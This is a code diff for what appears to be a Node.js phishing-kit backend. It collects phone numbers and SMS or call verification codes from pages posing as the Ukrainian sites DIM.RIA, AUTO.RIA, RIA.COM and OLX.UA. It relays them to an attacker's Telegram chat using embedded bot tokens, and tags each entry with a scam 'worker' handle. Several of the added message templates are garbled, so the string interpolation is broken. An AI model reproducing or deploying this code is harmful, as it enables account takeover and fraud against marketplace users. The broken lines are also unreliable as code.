@@ -6,14 +6,13 @@ const fetch = require('node-fetch');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const BOT_TOKEN = "8227870538:AAG6O3ojYrxz_COPKCkgUZy-GYSYxRfNKuc";
-const CHAT_ID = "-1003473672730";
+const BOT_TOKEN = "8328824616:AAHANYKzb3L-OyfTRL9GctPqE4TUGqwY7_U";
+const CHAT_ID = "-5045575691";
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
 app.use(bodyParser.json());
 app.use(express.static(__dirname));
 
-// === ЛОГОТИПИ ===
 const LOGOS = {
     dimria: "https://play-lh.googleusercontent.com/ztuWEFjw0OavxEvC_Zsxfg9J8gRj_eRFdsSMM7ElokPPUwmc2lAqCW47wbESieS6bw",
     autoria: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ed/43/65/ed436516-dde8-f65c-d03b-99a9f905fcbd/AppIcon-0-1x_U007emarketing-0-8-0-85-220-0.png/1200x630wa.png",
@@ -75,11 +74,11 @@ app.post('/api/send-data', async (req, res) => {
     let message = '';
 
     if (step === 'phone' && phone) {
-        message = `*ПРОЕКТ:* ${projectName} ⚡\n*Номер:* \`${phone}\`\n*Місто:* ${city}\n*Країна:* Україна`;
+        message = `*ПРОЕКТ:* \( {projectName} ⚡\n*Номер:* \` \){phone}\`\n*Місто:* ${city}\n*Країна:* Україна`;
         if (worker) message += `\n*Воркер:* @${worker}`;
     } 
     else if (step === 'code' && code) {
-        message = `*SMS КОД:* \`${code}\`\n*ПРОЕКТ:* ${projectName}\n*Місто:* ${city}`;
+        message = `*КОД З ДЗВІНКА:* \`\( {code}\`\n*ПРОЕКТ:* \){projectName}\n*Місто:* ${city}`;
         if (worker) message += `\n*Воркер:* @${worker}`;
     } 
     else {
@@ -91,9 +90,8 @@ app.post('/api/send-data', async (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`Сервер: http://localhost:${PORT}`);
-    console.log(`Панель: http://localhost:${PORT}/panel`);
+    console.log(`Сервер запущено: http://localhost:${PORT}`);
     setTimeout(() => {
-        sendToTelegram(`*Проекты успешно стали на сервер* ✅\nНаши проекты: DIM.RIA / AUTO.RIA / RIA.COM / OLX.UA`);
+        sendToTelegram(`*Проекти успішно запущено* ✅\nDIM.RIA / AUTO.RIA / RIA.COM / OLX.UA`);
     }, 3000);
 });
